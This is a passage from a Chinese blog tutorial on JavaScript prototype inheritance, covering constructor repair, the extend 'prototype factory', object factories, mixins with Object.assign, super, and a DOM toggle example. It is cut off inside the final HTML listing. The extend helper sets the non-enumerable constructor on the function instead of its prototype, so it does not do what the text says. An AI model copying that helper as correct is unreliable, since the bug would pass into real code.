Son.prototype.constructor();</span><br></pre></td></tr></table></figure><p>所以，为了避免它原先的constructor丢失造成的问题，我们需要把它纠正回来</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Son.prototype.constructor = Son;</span><br></pre></td></tr></table></figure><p>OK啦，只要在每次继承之后加上这句代码，就可以防止constructor丢失了，但其实在这里，还会有一个问题，让我们来遍历一下这个原型对象</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> Son.prototype) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(key);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们会得到什么结果：hi以及constructor，我们希望constructor出现吗，并不会，我们希望这些原本对象自带的属性是隐藏且不可遍历的，但是在这里，我们将原本丢失的自带构造器添加上去，导致其暴露并可以遍历出来，所以我们要将其可枚举的属性设置为false，如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// * 禁止自定义函数原型的constructor被遍历</span></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(Son.prototype, <span class="string">'constructor'</span>, &#123;</span><br><span class="line">  value: Son,</span><br><span class="line">  enumerable: <span class="literal">false</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>所以，最后，当我们需要构造函数继承时，需要以下三个步骤</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//继承</span></span><br><span class="line">Son.prototype = <span class="built_in">Object</span>.create(Father.prototype);</span><br><span class="line"></span><br><span class="line"><span class="comment">//恢复原有构造函数</span></span><br><span class="line">Son.prototype.constructor = Son;</span><br><span class="line"></span><br><span class="line"><span class="comment">// * 禁止自定义函数原型的constructor被遍历</span></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(Son.prototype, <span class="string">'constructor'</span>, &#123;</span><br><span class="line">  value: Son,</span><br><span class="line">  enumerable: <span class="literal">false</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="父类构造函数初始化属性"><a href="#父类构造函数初始化属性" class="headerlink" title="父类构造函数初始化属性"></a>父类构造函数初始化属性</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">User</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line">User.prototype.show = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`我叫<span class="subst">$&#123;<span class="keyword">this</span>.name&#125;</span>， 我今年<span class="subst">$&#123;<span class="keyword">this</span>.age&#125;</span>岁了`</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>上面是我们定义的一个父类构造函数，也就是说，有一个构造函数会继承它</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Admin</span>(<span class="params"></span>) </span>&#123;&#125;</span><br></pre></td></tr></table></figure><p>如何正确继承，哎对了，三步走实现继承</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Admin.prototype = <span class="built_in">Object</span>.create(User.prototype);</span><br><span class="line"></span><br><span class="line">Admin.prototype.constructor = Admin;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.defineProperty(Admin.prototype, <span class="string">'constructor'</span>, &#123;</span><br><span class="line">  value: Admin,</span><br><span class="line">  enumerable: <span class="literal">false</span>,</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>然后，我们现在想让Admin不用自定义的同时也可以同User一样初始化对象（name、age），怎么实现呢</p><p>前面有讲过的，改变User的this指向不就可以实现了吗</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Admin</span>(<span class="params">...args</span>) </span>&#123;</span><br><span class="line">  User.apply(<span class="keyword">this</span>, args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过args传值同时改变User实例化的this指向，从而实现Admin同User一样初始化属性</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> mayun = <span class="keyword">new</span> Admin(<span class="string">'mayun'</span>, <span class="number">22</span>);</span><br><span class="line">mayun.show();</span><br></pre></td></tr></table></figure><p>正确输出啦</p><h1 id="原型工厂封装属性"><a href="#原型工厂封装属性" class="headerlink" title="原型工厂封装属性"></a>原型工厂封装属性</h1><p>每次对构造函数原型进行继承，都要三步走，是不是有点麻烦，要是多个构造函数原型都要继承，岂不是要写很多次，所以我们把它给封装了吧，这样每次就可以直接调用啦</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">extend</span>(<span class="params">child, dad</span>) </span>&#123;</span><br><span class="line">  child.prototype = <span class="built_in">Object</span>.create(dad.prototype);</span><br><span class="line">  child.prototype.constructor = child;</span><br><span class="line">  <span class="built_in">Object</span>.defineProperty(child, <span class="string">'constructor'</span>, &#123;</span><br><span class="line">    value: child,</span><br><span class="line">    enumerable: <span class="literal">false</span>,</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>封装后的函数也称为原型工厂，我们来看看它的使用方法把</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extend(Son, Father);</span><br></pre></td></tr></table></figure><p>OK，这样子每次继承就不会很麻烦了，直接调用该函数即可</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extend(Daughter, Father);</span><br></pre></td></tr></table></figure><h1 id="对象工厂派生对象实现继承"><a href="#对象工厂派生对象实现继承" class="headerlink" title="对象工厂派生对象实现继承"></a>对象工厂派生对象实现继承</h1><p>我们之前已经了解过Object.create()可以实现对象继承，现在让我们来封装一个函数，来理解下构造函数实例化对象的原理，从而实现继承吧</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">User</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">  <span class="keyword">this</span>.age = age;</span><br><span class="line">&#125;</span><br><span class="line">User.prototype.show = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">this</span>.name + <span class="string">' is '</span> + <span class="keyword">this</span>.age;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先我们有这么一个构造函数，我们想用它创造出许多子对象（类似于构造函数初始化），如何实现呢</p><p>第一步便是克隆出构造函数原型对象（creat）</p><p>第二步初始化对象(call、apply（前面刚讲过）)</p><p>第三步便是返回这个对象啦</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 对象工厂造对象</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">admin</span>(<span class="params">name, age</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> instance = <span class="built_in">Object</span>.create(User.prototype);</span><br><span class="line">  User.call(instance, name, age);</span><br><span class="line">  <span class="keyword">return</span> instance;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>来实例化看看吧</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> dy = admin(<span class="string">'dy'</span>, <span class="number">18</span>);</span><br><span class="line"><span class="built_in">console</span>.log(dy.show())</span><br></pre></td></tr></table></figure><p>成功！</p><h1 id="使用mixin实现多继承"><a href="#使用mixin实现多继承" class="headerlink" title="使用mixin实现多继承"></a>使用mixin实现多继承</h1><p>在上面，我们了解到了可以借用其他原型链上的方法满足需求，但有没有其它方式可以使用其它原型链的方法呢。</p><p>“这个我知道，继承那个原型不就好嘛”，哎哟，好像有点道理哦，但这样却可能会导致继承的混乱。</p><p>我们知道，原型链为线形的，也就是说，你只能单向继承，大白话就是你只能有一个亲生爸爸，而如果这时候，跟上面的需求一样，arr数组想用Math对象中的方法时怎么办，</p><p>有小朋友提到了，我可以让Math当Array的爸爸嘛，这样顺着一条原型链上去就能实现方法了嘛，是的没错，但你有没有想过在这个过程中，只是你一个数组需要用到Math中的方法，如果其他数组不需要呢，那么它们也没办法，依然会被绑定到这条原型链上，这样就会造成这条原型链混乱且复杂。</p><p>我们更加希望，事物是有序的，一条继承链下来，对象之间都是有需求的，都是相关联且合理的，所以，这个方法并不可取</p><p>那么有什么方法可以实现这一需求呢：mixin思想，我们使用混入来实现类似多继承的效果，从而使得原原型链（主干）不受影响</p><p>这里要用到Object的一个方法实现类似mixin的思想</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.assign(obj1, obj2);</span><br></pre></td></tr></table></figure><p>首先创造一个事物构造函数还有其原型的一个方法show</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Thing</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line">Thing.prototype.show = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`我叫`</span> + <span class="keyword">this</span>.name);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后创造两个事物构造函数分别继承它，extend详见上面的原型工厂继承</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Human</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  Thing.call(<span class="keyword">this</span>, name);</span><br><span class="line">&#125;</span><br><span class="line">extend(Human, Thing);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Car</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line">  Thing.call(<span class="keyword">this</span>, name);</span><br><span class="line">&#125;</span><br><span class="line">extend(Car, Thing);</span><br></pre></td></tr></table></figure><p>然后实例化对象并验证下是否继承到了</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> xiaohong = <span class="keyword">new</span> Human(<span class="string">'xiaohong'</span>);</span><br><span class="line">xiaohong.show();</span><br><span class="line"><span class="keyword">let</span> benchi = <span class="keyword">new</span> Car(<span class="string">'banchi'</span>);</span><br><span class="line">benchi.show();</span><br></pre></td></tr></table></figure><p>很幸运，可以使用父类方法展示自己（我叫xiaohong，我叫banchi）</p><p>然后我们创建一个行为类action</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> action = &#123;</span><br><span class="line">  move() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name + <span class="string">'给我跑'</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">  call() &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>.name + <span class="string">'给我叫'</span>);</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>我们想让benchi和xiaohong都能使用这个类中的方法，但是他们已经有爹地了，这时候我们用mixin思想实现</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Object</span>.assign(benchi, action);</span><br><span class="line"><span class="built_in">Object</span>.assign(xiaohong, action);</span><br></pre></td></tr></table></figure><p>然后就执行方法吧</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">benchi.move(); <span class="comment">//banchi给我跑</span></span><br><span class="line">xiaohong.call(); <span class="comment">//xiaohong给我叫</span></span><br></pre></td></tr></table></figure><p>成功！我们实现了类似多继承</p><h1 id="mixin的内部继承以及super"><a href="#mixin的内部继承以及super" class="headerlink" title="mixin的内部继承以及super"></a>mixin的内部继承以及super</h1><p>还是依照上面的例子，我们想让mixin内部的对象实现继承且，banchi和xiaohong可以调用得到，如何实现嘞</p><p>假设有个todo类，想让它当action的爸爸</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> todo = &#123;</span><br><span class="line">  doing() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">'在 '</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其实还是和前面一样的继承，让action的__proto__继承todo即可</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">action.__proto__ = todo;</span><br></pre></td></tr></table></figure><p>这样便成功继承，然后我们稍微修改下action里面的方法，使得它可以调用父类todo的方法，这里我们用到<strong>super</strong>关键字</p><blockquote><p>super === this(action).__proto__（this指<strong>当前定义</strong>的对象）</p></blockquote><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> action = &#123;</span><br><span class="line">  move() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.show() + <span class="string">'，我'</span> + <span class="keyword">super</span>.doing() + <span class="string">'跑'</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">  call() &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.show() + <span class="string">'，我'</span> + <span class="keyword">super</span>.doing() + <span class="string">'叫'</span>;</span><br><span class="line">  &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后同上面一样运行一下，结果也是正常显示啦</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">console</span>.log(benchi.move());</span><br><span class="line"><span class="built_in">console</span>.log(xiaohong.call());</span><br></pre></td></tr></table></figure><p>我们来看一下他们之间的继承关系（可以多画画这种继承图帮助理解）</p><p><img src= "/img/loading.gif" data-src="/2021/08/22/%E5%8E%9F%E5%9E%8B/mixin%E6%8C%87%E5%90%91.png" alt="mixin指向"></p><p>好哒，这一部分我们就了解了mixin内部继承以及super代替原型（son.__proto__）这两个重要的知识点啦</p><h1 id="继承操作Dom（综合案例）"><a href="#继承操作Dom（综合案例）" class="headerlink" title="继承操作Dom（综合案例）"></a>继承操作Dom（综合案例）</h1><p>现在有这样一个需求，我们有三个几乎一样的组件，我们想让他们的功能一致，只是样式稍微不同而已，如下图所示</p><p><img src= "/img/loading.gif" data-src="/2021/08/22/%E5%8E%9F%E5%9E%8B/image-20210528214206292.png" alt="image-20210528214206292"></p><p>三者都是点击切换按钮切换状态语且改变背景颜色，点击隐藏，下面的状态语模块消失，同时按钮提示语改变，开始动手吧</p><p><img src= "/img/loading.gif" data-src="/2021/08/22/%E5%8E%9F%E5%9E%8B/image-20210528214431075.png" alt="image-20210528214431075"></p><p>样式不说，直接上核心代码</p><p>首先创造动作构造函数，并且定义三个方法——隐藏、显示、背景颜色以及提示语改变</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Animation</span>(<span class="params"></span>) </span>&#123;&#125;</span><br><span class="line">Animation.prototype.hide = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.style.display = <span class="string">'none'</span>;</span><br><span class="line">&#125;;</span><br><span class="line">Animation.prototype.show = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.style.display = <span class="string">'block'</span>;</span><br><span class="line">&#125;;</span><br><span class="line">Animation.prototype.change = <span class="function"><span class="keyword">function</span> (<span class="params">color, value</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.style.backgroundColor = color;</span><br><span class="line">  <span class="keyword">this</span>.innerHTML = value;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>创造APP构造函数用于创建展示模块</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">App</span>(<span class="params">id, data=&#123;&#125;</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.div = <span class="built_in">document</span>.querySelector(id);</span><br><span class="line">  <span class="keyword">this</span>.btnS = <span class="keyword">this</span>.div.querySelector(<span class="string">'[name="switch"]'</span>);</span><br><span class="line">  <span class="keyword">this</span>.btnH = <span class="keyword">this</span>.div.querySelector(<span class="string">'[name="hide"]'</span>);</span><br><span class="line">  <span class="keyword">this</span>.sec = <span class="keyword">this</span>.div.querySelector(<span class="string">'[name="sec"]'</span>);</span><br><span class="line">  <span class="keyword">this</span>.data = <span class="built_in">Object</span>.assign(&#123;</span><br><span class="line">    color: [<span class="string">'#8e44ad'</span>, <span class="string">'#16a085'</span>], </span><br><span class="line">    value: [<span class="string">'你好'</span>, <span class="string">'再见'</span>],</span><br><span class="line">    tog: <span class="literal">true</span>, <span class="comment">//用于记录切换状态</span></span><br><span class="line">  &#125;,data)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>让它继承于动作构造函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extend(App, Animation);</span><br></pre></td></tr></table></figure><p>接着为两个按钮注册点击事件，同时调用父类的显示隐藏以及切换背景方法</p><p>显示隐藏切换</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">App.prototype.changeIf = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.btnH.addEventListener(<span class="string">'click'</span>, () =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.btnH.value === <span class="string">'隐藏'</span>) &#123;</span><br><span class="line">      <span class="keyword">this</span>.hide.call(<span class="keyword">this</span>.sec);</span><br><span class="line">      <span class="keyword">this</span>.btnH.value = <span class="string">'显示'</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.show.call(<span class="keyword">this</span>.sec);</span><br><span class="line">      <span class="keyword">this</span>.btnH.value = <span class="string">'隐藏'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>状态语切换</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">App.prototype.toggle = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.btnS.addEventListener(<span class="string">'click'</span>, () =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">this</span>.data.tog) &#123;</span><br><span class="line">      <span class="keyword">this</span>.change.call(<span class="keyword">this</span>.sec, <span class="keyword">this</span>.data.color[<span class="number">1</span>], <span class="keyword">this</span>.data.value[<span class="number">1</span>]);</span><br><span class="line">      <span class="keyword">this</span>.data.tog = !<span class="keyword">this</span>.data.tog;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">this</span>.change.call(<span class="keyword">this</span>.sec, <span class="keyword">this</span>.data.color[<span class="number">0</span>], <span class="keyword">this</span>.data.value[<span class="number">0</span>]);</span><br><span class="line">      <span class="keyword">this</span>.data.tog = !<span class="keyword">this</span>.data.tog;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>以及首次打开页面的初始化方法</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">App.prototype.init = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.show.call(<span class="keyword">this</span>.sec)</span><br><span class="line">  <span class="keyword">this</span>.change.call(<span class="keyword">this</span>.sec, <span class="keyword">this</span>.data.color[<span class="number">0</span>], <span class="keyword">this</span>.data.value[<span class="number">0</span>])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后就是执行这三个方法的启动函数</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">App.prototype.run = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">this</span>.toggle();</span><br><span class="line">  <span class="keyword">this</span>.changeIf();</span><br><span class="line">  <span class="keyword">this</span>.init()</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>然后就可以实例化对象，调用run方法啦</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> div1 = <span class="keyword">new</span> App(<span class="string">'#app1'</span>, &#123;</span><br><span class="line"> color: [<span class="string">'#27ae60'</span>, <span class="string">'#2980b9'</span>],</span><br><span class="line"> value: [<span class="string">'hello'</span>, <span class="string">'bye'</span>] </span><br><span class="line">&#125;);</span><br><span class="line">div1.run();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> div2 = <span class="keyword">new</span> App(<span class="string">'#app2'</span>);</span><br><span class="line">div2.run();</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> div3 = <span class="keyword">new</span> App(<span class="string">'#app3'</span>, &#123;</span><br><span class="line">  color: [<span class="string">'#d35400'</span>, <span class="string">'#f39c12'</span>]</span><br><span class="line">&#125;)</span><br><span class="line">div3.run()</span><br></pre></td></tr></table></figure><p>就算你有其它需要类似功能的模块，你也可以直接实例化该对象并执行run方法，而不用每个同功能的模块书写多次相同冗余的代码了</p><p>全部代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span 